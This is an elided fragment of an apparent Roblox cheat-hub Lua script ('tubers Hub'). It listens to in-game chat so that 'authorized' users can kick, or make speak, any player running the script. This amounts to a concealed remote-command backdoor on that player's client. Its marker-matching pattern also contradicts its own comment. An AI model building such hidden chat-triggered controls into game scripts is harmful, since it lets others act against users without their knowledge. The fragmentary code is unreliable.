...
--// Jogadores autorizados por envio de tubers_####
...
local function ProcessarMensagem(msgText, authorName)
    ...
    if comandoLower:match(";kick%s+" .. targetLower) then
        LocalPlayer:Kick("You got kicked by tubers Hub")
    end
    ...
    -- COMANDO UNIVERSAL ;verifique -> faz o local player enviar tubers_####
    if comandoLower:match("^;verifique") then
        local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral") or TextChatService.TextChannels:GetChildren()[1]
        if canal then
            canal:SendAsync("tubers_####")
        end
    end

    -- DETECÇÃO: se a mensagem contém tubers_#### (case-insensitive)
    -- registra o autor como autorizado e atualiza tag
    if msgText:match("[Nn]tubers_%d%d%d%d") then
...
if ok and WindUILib then
    local Window = WindUILib:CreateWindow({
        Title = "☄️ tubers Hub - Admins/Developers ☄️",
        Icon =  "star",
        Author = "by: silvadeV",
        Folder = "tubers - Admins",
